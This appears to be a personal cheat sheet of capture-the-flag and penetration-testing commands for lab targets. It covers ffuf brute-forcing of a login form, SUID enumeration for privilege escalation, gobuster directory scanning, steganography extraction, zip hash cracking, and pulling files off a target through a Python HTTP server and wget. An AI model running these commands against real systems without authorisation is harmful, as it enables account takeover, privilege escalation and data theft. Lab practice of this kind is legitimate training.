
### bruteforce using ffuf

`ffuf -w <user_file>:W1,<password_file>:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u <URL> -fc 200`

eg. `ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.112.141.165/customers/login -fc 200`

### vscode:

`shift + command + F` searches for selected text in all files

### generic recursive search for a file, no error flood

`find / -name flag.txt 2>/dev/null`


### history cut to get only the commands

`history | cut -d " " -f 5`

### find SUID binaries unprivileged

`find / -user root -perm /4000 2>/dev/null`

usually suffices to find SUID binaries (does not use sudo - eg. sudo -l )

### gobuster no tls verification - just disable it

`gobuster dir -u https://bricks.thm -w /usr/share/wordlists/dirb/common.txt -x .js,.php,.txt -k`

### ftp get all files

`mget *`

### steganography file extraction #stego

`binwalk -e <file>`

### stego password protected file

first verify there is something `steghide info cute-alien.jpg`

then extract it `steghide extract -sf cute-alien.jpg`

### zip password bruteforce

`zip2john 8702.zip > zip.hash && john zip.hash`

### download file from target

target: `python3 -m http.server 8000`

attacker: `wget http://TARGET_IP:8000/flag.txt`

does not matter where the file is